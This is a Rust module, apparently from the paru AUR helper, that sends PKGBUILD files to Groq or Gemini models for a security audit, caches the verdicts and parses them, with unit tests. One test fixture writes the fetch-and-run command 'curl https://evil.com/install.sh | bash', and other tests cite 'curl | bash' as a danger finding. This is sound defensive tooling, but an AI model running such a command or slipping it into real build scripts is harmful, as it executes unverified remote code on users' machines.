use std::collections::HashMap;
use std::fs;
use std::path::Path;
use std::path::PathBuf;
use std::process::Command;

use anyhow::{Context, Result};
use serde::{Deserialize, Serialize};

const SYSTEM_PROMPT: &str = "\
You are a security auditor reviewing Arch Linux PKGBUILD files. \
Analyze each PKGBUILD for security issues such as: \
arbitrary command execution risks, suspicious source URLs or checksums, \
use of eval or dynamic code execution, download of unverified binaries, \
overly broad permissions, and any other red flags. \
Respond with JSON: {\"packages\": [{\"name\": \"<name from the === name === header>\", \
\"verdict\": \"SAFE\" | \"CAUTION\" | \"DANGER\", \"findings\": [\"<short finding>\"]}]}. \
Use an empty findings list if nothing is suspicious.";

// --- Cache ---

pub struct LlmCache {
    path: PathBuf,
    data: HashMap<String, String>,
}

impl LlmCache {
    pub fn load(cache_dir: &Path) -> Self {
        let path = cache_dir.join("llm-review.json");
        let data = fs::read_to_string(&path)
            .ok()
            .and_then(|s| serde_json::from_str(&s).ok())
            .unwrap_or_default();
        Self { path, data }
    }

    pub fn get(&self, provider: &str, pkg: &str, commit: &str) -> Option<&str> {
        self.data
            .get(&format!("{}:{}:{}", provider, pkg, commit))
            .map(|s| s.as_str())
            .filter(|s| !s.is_empty())
    }

    pub fn insert(&mut self, provider: &str, pkg: &str, commit: &str, result: String) {
        self.data
            .insert(format!("{}:{}:{}", provider, pkg, commit), result);
    }

    pub fn save(&self) {
        if let Ok(json) = serde_json::to_string(&self.data) {
            let _ = fs::write(&self.path, json);
        }
    }
}

pub fn get_commit_hash(pkg_dir: &Path) -> Option<String> {
    let output = Command::new("git")
        .arg("-C")
        .arg(pkg_dir)
        .args(["rev-parse", "HEAD"])
        .output()
        .ok()?;
    if output.status.success() {
        Some(String::from_utf8(output.stdout).ok()?.trim().to_string())
    } else {
        None
    }
}

#[derive(Deserialize)]
struct Report {
    packages: Vec<PkgReport>,
}

#[derive(Deserialize)]
struct PkgReport {
    name: String,
    verdict: String,
    #[serde(default)]
    findings: Vec<String>,
}

/// Returns "VERDICT\n- finding\n- finding" per package name.
pub fn parse_response(response: &str) -> Result<HashMap<String, String>> {
    let report: Report =
        serde_json::from_str(response.trim()).context("LLM returned malformed JSON")?;
    Ok(report
        .packages
        .into_iter()
        .map(|p| {
            let mut text = p.verdict;
            for f in p.findings {
                text.push_str("\n- ");
                text.push_str(&f);
            }
            (p.name, text)
        })
        .collect())
}

// --- Shared ---

fn build_prompt(pkgs: &[(&str, &Path)]) -> Result<String> {
    let mut prompt = String::new();
    for &(name, path) in pkgs {
        let content = fs::read_to_string(path)
            .with_context(|| format!("failed to read {}", path.display()))?;
        prompt.push_str(&format!("=== {} ===\n```\n{}\n```\n\n", name, content));
    }
    Ok(prompt)
}

// --- Groq (OpenAI-compatible) ---

const GROQ_API_URL: &str = "https://api.groq.com/openai/v1/chat/completions";
const GROQ_MODEL: &str = "llama-3.3-70b-versatile";

#[derive(Serialize)]
struct ChatRequest {
    model: String,
    messages: Vec<ChatMessage>,
    max_tokens: u32,
    temperature: f32,
    response_format: serde_json::Value,
}

#[derive(Serialize, Deserialize)]
struct ChatMessage {
    role: String,
    content: String,
}

#[derive(Deserialize)]
struct ChatResponse {
    choices: Vec<ChatChoice>,
}

#[derive(Deserialize)]
struct ChatChoice {
    message: ChatMessage,
}

pub fn check_pkgbuilds_groq(api_key: &str, pkgs: &[(&str, &Path)]) -> Result<String> {
    let request = ChatRequest {
        model: GROQ_MODEL.to_string(),
        messages: vec![
            ChatMessage {
                role: "system".to_string(),
                content: SYSTEM_PROMPT.to_string(),
            },
            ChatMessage {
                role: "user".to_string(),
                content: build_prompt(pkgs)?,
            },
        ],
        max_tokens: 8192,
        temperature: 0.1,
        response_format: serde_json::json!({ "type": "json_object" }),
    };

    let client = reqwest::blocking::Client::new();
    let response = client
        .post(GROQ_API_URL)
        .bearer_auth(api_key)
        .json(&request)
        .send()
        .context("failed to contact Groq API")?;

    if !response.status().is_success() {
        let status = response.status();
        let body = response.text().unwrap_or_default();
        anyhow::bail!("Groq API error {}: {}", status, body);
    }

    let parsed: ChatResponse = response
        .json()
        .context("failed to parse Groq API response")?;

    parsed
        .choices
        .into_iter()
        .next()
        .map(|c| c.message.content)
        .context("empty response from Groq API")
}

// --- Gemini ---

const GEMINI_API_URL: &str =
    "https://generativelanguage.googleapis.com/v1beta/models/gemini-3.5-flash-lite:generateContent";

#[derive(Serialize)]
struct GeminiRequest {
    #[serde(rename = "systemInstruction")]
    system_instruction: GeminiContent,
    contents: Vec<GeminiContent>,
    #[serde(rename = "generationConfig")]
    generation_config: GeminiGenerationConfig,
}

#[derive(Serialize)]
struct GeminiGenerationConfig {
    #[serde(rename = "maxOutputTokens")]
    max_output_tokens: u32,
    temperature: f32,
    #[serde(rename = "responseMimeType")]
    response_mime_type: &'static str,
    #[serde(rename = "responseSchema")]
    response_schema: serde_json::Value,
}

#[derive(Serialize, Deserialize)]
struct GeminiContent {
    parts: Vec<GeminiPart>,
}

#[derive(Serialize, Deserialize)]
struct GeminiPart {
    text: String,
}

#[derive(Deserialize)]
struct GeminiResponse {
    candidates: Vec<GeminiCandidate>,
}

#[derive(Deserialize)]
struct GeminiCandidate {
    content: GeminiContent,
}

pub fn check_pkgbuilds_gemini(api_key: &str, pkgs: &[(&str, &Path)]) -> Result<String> {
    let request = GeminiRequest {
        system_instruction: GeminiContent {
            parts: vec![GeminiPart {
                text: SYSTEM_PROMPT.to_string(),
            }],
        },
        contents: vec![GeminiContent {
            parts: vec![GeminiPart {
                text: build_prompt(pkgs)?,
            }],
        }],
        generation_config: GeminiGenerationConfig {
            max_output_tokens: 8192,
            temperature: 0.1,
            response_mime_type: "application/json",
            response_schema: serde_json::json!({
                "type": "OBJECT",
                "properties": { "packages": { "type": "ARRAY", "items": {
                    "type": "OBJECT",
                    "properties": {
                        "name": { "type": "STRING" },
                        "verdict": { "type": "STRING", "enum": ["SAFE", "CAUTION", "DANGER"] },
                        "findings": { "type": "ARRAY", "items": { "type": "STRING" } },
                    },
                    "required": ["name", "verdict", "findings"],
                }}},
                "required": ["packages"],
            }),
        },
    };

    let client = reqwest::blocking::Client::new();
    let response = client
        .post(GEMINI_API_URL)
        .query(&[("key", api_key)])
        .json(&request)
        .send()
        .context("failed to contact Gemini API")?;

    if !response.status().is_success() {
        let status = response.status();
        let body = response.text().unwrap_or_default();
        anyhow::bail!("Gemini API error {}: {}", status, body);
    }

    let parsed: GeminiResponse = response
        .json()
        .context("failed to parse Gemini API response")?;

    parsed
        .candidates
        .into_iter()
        .next()
        .and_then(|c| c.content.parts.into_iter().next())
        .map(|p| p.text)
        .context("empty response from Gemini API")
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;
    use tempfile::TempDir;

    fn tmp() -> TempDir {
        tempfile::tempdir().expect("failed to create tempdir")
    }

    // --- parse_response ---

    #[test]
    fn parse_response_formats_verdict_then_findings() {
        let input = r#"{"packages": [
            {"name": "clean-pkg", "verdict": "SAFE", "findings": []},
            {"name": "bad-pkg", "verdict": "DANGER", "findings": ["Runs curl | bash", "Uses eval"]}
        ]}"#;
        let result = parse_response(input).unwrap();
        assert_eq!(result.get("clean-pkg").unwrap(), "SAFE");
        assert_eq!(
            result.get("bad-pkg").unwrap(),
            "DANGER\n- Runs curl | bash\n- Uses eval"
        );
    }

    // Truncated or non-JSON output must be an error, not an empty report.
    #[test]
    fn parse_response_rejects_malformed_json() {
        assert!(parse_response(r#"{"packages": [{"name": "pkg", "verd"#).is_err());
        assert!(parse_response("=== pkg ===\nSAFE").is_err());
    }

    // An empty verdict cached by an older parser must not be served.
    #[test]
    fn cache_empty_entry_is_miss() {
        let dir = tmp();
        let mut cache = LlmCache::load(dir.path());
        cache.insert("gemini", "pkg", "abc", String::new());
        assert!(cache.get("gemini", "pkg", "abc").is_none());
    }

    // --- LlmCache ---

    #[test]
    fn cache_miss_when_empty() {
        let dir = tmp();
        let cache = LlmCache::load(dir.path());
        assert!(cache.get("groq", "pkg", "abc").is_none());
    }

    #[test]
    fn cache_hit_after_insert() {
        let dir = tmp();
        let mut cache = LlmCache::load(dir.path());
        cache.insert("groq", "pkg", "abc", "SAFE".to_string());
        assert_eq!(cache.get("groq", "pkg", "abc").unwrap(), "SAFE");
    }

    // A new commit hash for the same package must be a cache miss —
    // otherwise a security fix in a PKGBUILD would serve the old verdict.
    #[test]
    fn cache_miss_on_new_commit_hash() {
        let dir = tmp();
        let mut cache = LlmCache::load(dir.path());
        cache.insert("groq", "pkg", "oldcommit", "SAFE".to_string());
        assert!(
            cache.get("groq", "pkg", "newcommit").is_none(),
            "stale commit must not serve cached verdict"
        );
    }

    // Different providers analyse independently; one provider's cache
    // must not satisfy another provider's lookup.
    #[test]
    fn cache_miss_on_different_provider() {
        let dir = tmp();
        let mut cache = LlmCache::load(dir.path());
        cache.insert("groq", "pkg", "abc", "SAFE".to_string());
        assert!(cache.get("gemini", "pkg", "abc").is_none());
    }

    // Overwriting an entry must replace, not duplicate.
    #[test]
    fn cache_insert_overwrites_existing_entry() {
        let dir = tmp();
        let mut cache = LlmCache::load(dir.path());
        cache.insert("groq", "pkg", "abc", "SAFE".to_string());
        cache.insert("groq", "pkg", "abc", "DANGER\nNow it's bad.".to_string());
        assert_eq!(
            cache.get("groq", "pkg", "abc").unwrap(),
            "DANGER\nNow it's bad."
        );
    }

    // After save+reload all entries must survive, including DANGER verdicts.
    #[test]
    fn cache_persists_danger_verdict_across_reload() {
        let dir = tmp();
        {
            let mut cache = LlmCache::load(dir.path());
            cache.insert(
                "groq",
                "bad-pkg",
                "abc",
                "DANGER\nRuns curl | bash.".to_string(),
            );
            cache.save();
        }
        let cache = LlmCache::load(dir.path());
        let verdict = cache.get("groq", "bad-pkg", "abc").unwrap();
        assert!(verdict.starts_with("DANGER"));
        assert!(verdict.contains("curl | bash"));
    }

    // A corrupt cache file must not crash paru — fall back to empty cache.
    #[test]
    fn cache_load_tolerates_corrupt_file() {
        let dir = tmp();
        fs::write(dir.path().join("llm-review.json"), b"not valid json").unwrap();
        let cache = LlmCache::load(dir.path());
        assert!(cache.get("groq", "pkg", "abc").is_none());
    }

    // --- build_prompt ---

    // The PKGBUILD content must appear verbatim inside a code block so the
    // LLM treats it as code, not prose.
    #[test]
    fn build_prompt_wraps_pkgbuild_in_code_block() {
        let dir = tmp();
        let path = dir.path().join("PKGBUILD");
        fs::write(&path, "curl https://evil.com/install.sh | bash").unwrap();

        let prompt = build_prompt(&[("evil-pkg", path.as_path())]).unwrap();
        assert!(prompt.contains("```\ncurl https://evil.com/install.sh | bash\n```"));
    }

    // The package name must appear as the section header the LLM is asked to use.
    #[test]
    fn build_prompt_uses_correct_section_header() {
        let dir = tmp();
        let path = dir.path().join("PKGBUILD");
        fs::write(&path, "pkgname=hello").unwrap();

        let prompt = build_prompt(&[("hello", path.as_path())]).unwrap();
        assert!(prompt.contains("=== hello ==="));
    }

    // With multiple packages both must appear and in submission order.
    #[test]
    fn build_prompt_preserves_order_of_packages() {
        let dir = tmp();
        let p1 = dir.path().join("P1");
        let p2 = dir.path().join("P2");
        fs::write(&p1, "pkgname=alpha").unwrap();
        fs::write(&p2, "pkgname=beta").unwrap();

        let prompt = build_prompt(&[("alpha", p1.as_path()), ("beta", p2.as_path())]).unwrap();
        let alpha_pos = prompt.find("=== alpha ===").unwrap();
        let beta_pos = prompt.find("=== beta ===").unwrap();
        assert!(alpha_pos < beta_pos);
    }

    #[test]
    fn build_prompt_missing_file_returns_error() {
        let result = build_prompt(&[("ghost", Path::new("/nonexistent/PKGBUILD"))]);
        assert!(result.is_err());
    }
}
